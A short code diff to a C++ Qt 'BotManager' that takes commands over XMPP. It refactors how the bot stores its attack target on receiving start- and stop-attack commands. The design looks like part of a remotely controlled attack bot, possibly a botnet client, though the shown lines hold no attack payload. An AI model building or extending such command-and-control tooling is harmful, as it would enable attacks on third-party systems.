@@ -57,11 +57,12 @@ void BotManager::commandReceivedOnBot(Message *command)
         dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);
     } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
         response = new AttackStartedResponse(command -> id());
-        _target = startAttackCommand -> target();
         _bot -> setState(AttackInProgress);
+        _bot -> setAttack(Attack(startAttackCommand -> id(), startAttackCommand -> target()));
     } else if(dynamic_cast<StopAttackCommand *>(command)) {
         response = new AttackStoppedResponse(command -> id());
         _bot -> setState(WaitingForCommand);
+        _bot -> setAttack(Attack());
     } else
         isValid = false;
 
@@ -91,8 +92,6 @@ BotManager::BotManager()
     _xmppClient -> setParent(this);
 
     _bot = new Bot;
-
-    _target = "";
 
     _networkAccessManager = new QNetworkAccessManager(this);
 
